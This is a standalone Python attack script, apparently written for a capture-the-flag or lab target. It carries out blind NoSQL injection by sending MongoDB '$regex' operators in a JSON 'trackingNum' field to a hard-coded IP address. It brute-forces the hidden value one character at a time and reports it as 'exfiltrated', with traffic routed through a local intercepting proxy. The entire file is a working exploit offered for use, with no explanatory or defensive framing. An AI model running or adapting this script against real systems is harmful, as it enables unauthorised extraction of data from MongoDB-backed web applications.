import requests
import re
import string

tegex_string = 'Franz'

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# Define the URL and headers
url = 'http://94.237.54.115:54940/index.php'
headers = {
    'Host': '94.237.59.180:58285',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-type': 'application/json',
    'Origin': 'http://94.237.59.180:58285',
    'Connection': 'keep-alive',
    'Referer': 'http://94.237.59.180:58285/',
    'Priority': 'u=0'
}

def send_request(payload):
    response = requests.post(url, json=payload, headers=headers, proxies=proxies)
    return response.text

def search_response(response_text, search_string):
    if re.search(search_string, response_text):
        print(f"Found string '{search_string}' in the response.")
        return True
    else:
        print(f"Did not find string '{search_string}' in the response.")
        return False

def test_attribute(test_value):
    payload = {
        "trackingNum": {
            "$regex": f"^{test_value}.*"
        }
    }
    response_text = send_request(payload)
    return search_response(response_text, tegex_string)

def exfiltrate_attribute():
    exfiltrated_value = ""
    iteration = 1
    characters = string.digits + string.ascii_lowercase + string.ascii_uppercase  # Using only digits for brute-forcing

    while True:
        found = False
        print(f"[*] Starting iteration {iteration}: Current exfiltrated value: '{exfiltrated_value}'")

        for char in characters:
            test_value = exfiltrated_value + char
            print(f"[*] Testing character: '{char}' -> Current test value: '{test_value}'")

            if test_attribute(test_value):
                exfiltrated_value += char
                print(f"[+] Found character '{char}': Exfiltrated value so far: '{exfiltrated_value}'")
                found = True
                break

        if not found:
            print(f"[!] No more characters found. Exfiltration complete.")
            print(f"[+] Finished exfiltrating: {exfiltrated_value}")
            break

        iteration += 1

    return exfiltrated_value

if __name__ == "__main__":
    print("[*] Starting attribute exfiltration process...")
    description_value = exfiltrate_attribute()
    print(f"[+] Exfiltrated {tegex_string}: {description_value}")